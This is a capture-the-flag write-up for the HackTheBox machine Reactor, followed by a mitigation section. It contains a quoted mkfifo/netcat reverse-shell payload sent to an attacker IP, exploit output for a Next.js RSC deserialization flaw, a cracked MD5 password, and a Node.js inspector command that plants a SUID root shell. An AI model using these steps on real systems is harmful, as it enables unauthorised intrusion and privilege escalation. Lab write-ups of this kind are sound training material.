---
title: Reactor
machineName: Reactor
os: linux
difficulty: easy
season: Season 11
tags:
  - Next.js
  - React Server Components
  - CVE-2025-55182
  - CVE-2025-66478
  - Deserialization RCE
  - Hashcat
  - MD5 Cracking
  - Node.js Inspector
  - V8 Debugger Protocol
  - SUID Bash
  - Privilege Escalation
date: '2026-05-28'
pointsAwarded: 20
machineIP: '10.129.8.225'
summary: '---'
---

# 🛡️ HTB - Reactor (Easy)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Reactor
- **Operating System:** Linux
- **Difficulty:** Easy
- **Date of Scan:** 2026-05-28
- **Vulnerabilities:** Next.js Server Components RCE (CVE-2025-55182 / CVE-2025-66478), Weak MD5 Password Hashing, V8 / Node.js Inspector Arbitrary Code Execution (Port 9229)

---

## Step 1 - Reconnaissance

### Nmap Port Scanning & Next.js Service Reconnaissance

Will Use Nmap To See what Ports and Services are Open:

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.8.225
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-28 12:18 UTC
Nmap scan report for 10.129.8.225
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Thu, 28 May 2026 12:18:20 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script>
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Thu, 28 May 2026 12:18:21 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Thu, 28 May 2026 12:18:22 GMT
|_    Connection: close
1 service unrecognized despite returning data.
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   230.96 ms 10.10.14.1
2   233.79 ms 10.129.8.225

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.76 seconds
```

- 🔍 *Easy Linux machine, with no HTTP!!*
- 🔍 *Not actually, it is diverted on port 3000, look closely at the response HTTP/1.1 200 OK in the scan report!*
- 🔍 *While enumerating it is a react and next.js page, and using wappalyzer i have found the version for Next.js ---> 15.0.3.*
- 🔍 *While looking for any known vulnerabilities for this version i have got this:*

```text
Remote Code Execution (CVE-2025-66478 / CVE-2025-55182) Severity: Critical (CVSS 10.0).

Description: A flaw in the React Server Components (RSC) protocol allows unauthenticated attackers to execute arbitrary code on the server. It stems from unsafe deserialization of attacker-controlled data within server-side RSC payloads.
```

- 🔍 *Also i have found a public exploit as well:*
- 🔍 *`https://github.com/Spritualkb/CVE-2025-55182-exp.git`*
- 🔍 *The interesting part of the script was its reverse shell method, i was getting 500 internal error on the default rev shell payload:*

```python
    def reverse_shell(self, attacker_ip: str, attacker_port: int) -> dict:
        """
        Attempt to establish a reverse shell
        
        @param attacker_ip: IP address to connect back to
        @param attacker_port: Port to connect back to
        """
        # mkfifo reverse shell - works on Alpine/busybox containers
        revshell = (
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f"
        )
        
        print(Colors.warning(f"Attempting reverse shell to {Colors.highlight(f'{attacker_ip}:{attacker_port}')}"))
        print(Colors.warning(f"Start listener: {Colors.highlight(f'nc -lvnp {attacker_port}')}"))
        
        return self.execute(revshell)
```

- `rm /tmp/f;`: Deletes any old temporary files named f in the `/tmp` directory to avoid conflicts.
- `mkfifo /tmp/f;`: Creates a brand new "Named Pipe" (First-In, First-Out file buffer) at `/tmp/f`. Think of this file like a plumbing pipe; anything poured into one end flows right out the other end.
- `cat /tmp/f | sh -i 2>&1`: This reads whatever commands land in the `/tmp/f` pipe, flows them into an interactive shell (`sh -i`), and merges terminal errors (`2>&1`) into the main output stream.
- `| nc {attacker_ip} {attacker_port} >/tmp/f`: It takes the results of those shell commands, pipes them across the network via Netcat (`nc`) to your local machine, and loops your incoming keystrokes right back into the `/tmp/f` pipe.

---

## Step 2 - Initial Foothold

### Next.js RSC Server Action Deserialization Exploit

- 🔍 *Start the nc listener:*

```bash
nc -lvnp 6666
```

- 🔍 *Clone the repo and execute the command with `--revshell` flag:*
- 🔍 *Execute the command:*

```bash
python3 exp.py http://reactor.htb:3000 --revshell 10.10.15.169 6666 
```

```text
╔═══════════════════════════════════════════════════════════════╗                                   
║  CVE-2025-55182 - React Server Components RCE Exploit         ║                                      
║  Next.js Remote Code Execution Tool                           ║                                     
╚═══════════════════════════════════════════════════════════════╝                                   

[!] Attempting reverse shell to 10.10.15.169:6666
[!] Start listener: nc -lvnp 6666
[*] Target: http://reactor.htb:3000
[*] Command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.169 6666 >/tmp/f             
[*] Sending exploit payload...
[+] Command executed! Result in redirect: /login?a=rm: cannot remove '/tmp/f': No such file or directory;push
```

- 🔍 *On listener:*

```bash
nc -lvnp 6666
```

```text
listening on [any] 6666 ...
connect to [10.10.15.169] from (UNKNOWN) [10.129.8.225] 59398
sh: 0: can't access tty; job control turned off
$ whoami
node
```

- 🔍 *Now as this is a container, we need escape it via finding some creds:*

```bash
cat reactor.db
```

```text
PC##Mtablesensor_logssensor_logsCREATE TABLE sensor_logs (
    id INTEGER PRIMARY KEY,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    sensor_id TEXT,
    reading REAL,
    status TEXT
)-9tableusersusersCREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
iiJM5engineer39d97110eafe2a9a68639812cd271e8eoperatorengineer@reactor.htbIM'/admina203b22191d744a4e70ad__43%025-12-28 14:32:01COOLANT_FLOW@2ffffffCAUTION33#025-12-28 14:32:01PRESSURE_01@cffffffNOMINAL43%025-12-28 14:32:01CORE_TEMP_01@tHNOMINAL
```

- 🔍 *We got an MD5 hash:*

```bash
hashid "39d97110eafe2a9a68639812cd271e8e"
```

```text
Analyzing '39d97110eafe2a9a68639812cd271e8e'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
```

- 🔍 *Confirmed MD5.*
- 🔍 *Crack using hashcat:*

```text
39d97110eafe2a9a68639812cd271e8e:reactor1
```

- 🔍 *Got the password for engineer!*

---

## Step 3 - Privilege Escalation

### V8 Inspector Debug Protocol Abuse via Port 9229

- 🔍 *Now lets get the ssh for engineer:*

```bash
ssh engineer@reactor.htb
# Password: reactor1
```

```text
The authenticity of host 'reactor.htb (10.129.8.225)' can't be established.
ED25519 key fingerprint is SHA256:9v9mCPC4gn2EN/IbKKwhV8KZoNVTsVPorFhlTkNByPM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'reactor.htb' (ED25519) to the list of known hosts.
engineer@reactor.htb's password: 
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Thu May 28 14:31:00 2026 from 10.10.15.169
engineer@reactor:~$ 
```

- 🔍 *grab the user flag!*
- 🔍 *Now while enumerating i have found an internal port:*

```bash
engineer@reactor:~$ ss -tulpn
```

```text
Netid State  Recv-Q  Send-Q   Local Address:Port         Peer Address:Port        Process       
udp   UNCONN 0       0           127.0.0.54:53                0.0.0.0:*                         
udp   UNCONN 0       0        127.0.0.53%lo:53                0.0.0.0:*                         
udp   UNCONN 0       0              0.0.0.0:68                0.0.0.0:*                         
tcp   LISTEN 0       4096     127.0.0.53%lo:53                0.0.0.0:*                         
tcp   LISTEN 0       511          127.0.0.1:9229              0.0.0.0:*                         
tcp   LISTEN 0       4096        127.0.0.54:53                0.0.0.0:*                         
tcp   LISTEN 0       4096           0.0.0.0:22                0.0.0.0:*                         
tcp   LISTEN 0       4096              [::]:22                   [::]:*                         
tcp   LISTEN 0       511                  *:3000                    *:* 
```

- 🔍 *Port 9229 is the default TCP port used for Node.js and V8 inspector protocol debugging. It allows you to connect your code and external development tools so you can set breakpoints, pause execution, and inspect variables.*
- 🔍 *By this we can determine that a Node.js process was running with the `--inspect` flag enabled internally, means we can pass the javascript inside the inspect!*

```bash
engineer@reactor:~$ node inspect 127.0.0.1:9229
```

```text
connecting to 127.0.0.1:9229 ... ok
debug> exec("process.mainModule.require('child_process').execSync('id')")
Uint8Array(39)  #Of course it won't gonna show the output directly!
debug> exec("process.mainModule.require('child_process').execSync('whoami')")
Uint8Array(5)
debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')")
Uint8Array(0)
```

- 🔍 *We can execute any RCE command with `process.mainModule.require('child_process').execSync`, so we did. now just grab the shell:*

```bash
engineer@reactor:/sys$ /tmp/rootbash -p
```

```text
rootbash-5.2# ls
block  dev       fs          module
bus    devices   hypervisor  power
class  firmware  kernel
rootbash-5.2# cd /root
rootbash-5.2# ls
root.txt
```

- 🔍 *Done!!*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Security Assessment Blueprint**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Reactor system. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Next.js React Server Components Unsafe Deserialization (CVE-2025-55182 / CVE-2025-66478)

> [!WARNING]
> **Vulnerability Profile:**
> Next.js version 15.0.3 failed to sanitize untrusted serialized data passed across the React Server Components wire protocol, allowing unauthenticated attackers to trigger remote code execution via forged RSC action requests.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Unauthenticated RCE allows immediate code execution inside the Node.js application container, giving attackers access to local application databases (`reactor.db`), environment secrets, and internal network pivots.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Upgrade Next.js to version 15.0.4 or newer, where strict validation of RSC flight payloads and action IDs is enforced.
> - **Remediation:** Run web applications inside minimal unprivileged container contexts with read-only root filesystems (`readOnlyRootFilesystem: true`) to impede payload staging in `/tmp`.
> - **Detection:** Monitor HTTP request headers for anomalous `RSC` or `Next-Action` parameters containing nested shell commands or serialized pipe syntax.

---

### 🟡 Insecure Node.js / V8 Inspector Protocol Exposure (Port 9229)

> [!WARNING]
> **Vulnerability Profile:**
> A root-privileged Node.js daemon was spawned with the `--inspect` flag listening on `127.0.0.1:9229` without token authentication or mutual TLS.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Any unprivileged local user who discovers port 9229 can attach via `node inspect` and invoke `child_process.execSync()` under the high-privilege parent user context, directly bypassing all operating system access controls.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Never run production services with the `--inspect` or `--inspect-brk` flag enabled. Limit debugging flags strictly to local development sandboxes.
> - **Remediation:** If profiling is required in production, restrict attachment via Unix domain sockets with strict filesystem ACLs (`chmod 600`) owned solely by the running user.
> - **Detection:** Deploy Linux audit rules (`auditd`) to alert whenever `node` or `v8` processes spawn `/bin/bash` with SUID arguments (`-p`).
